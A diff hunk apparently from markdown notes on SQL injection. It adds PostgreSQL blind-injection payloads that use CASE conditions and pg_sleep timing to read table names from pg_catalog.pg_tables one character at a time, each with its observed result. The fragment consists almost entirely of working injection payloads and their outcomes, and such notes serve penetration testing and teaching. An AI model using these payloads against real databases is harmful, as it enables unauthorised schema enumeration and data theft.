@@ -381,4 +381,8 @@ select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (se
 select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=98 THEN 't' ELSE 'a' END)||''; <<-- no result
 
 select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select 'a'),1,1)))=97 THEN pg_sleep(5) ELSE 'a' END)||''; <<-- canceling statement due to statement timeout
+
+select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1)))=115 THEN pg_sleep(5) ELSE 'a' END)||''; <<-- canceling statement due to statement timeout
+
+select firstname from scientist where firstname = 'alber'||(SELECT CASE WHEN (select ascii(substr((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1)))=116 THEN pg_sleep(5) ELSE 'a' END)||''; <<-- no result
 ```
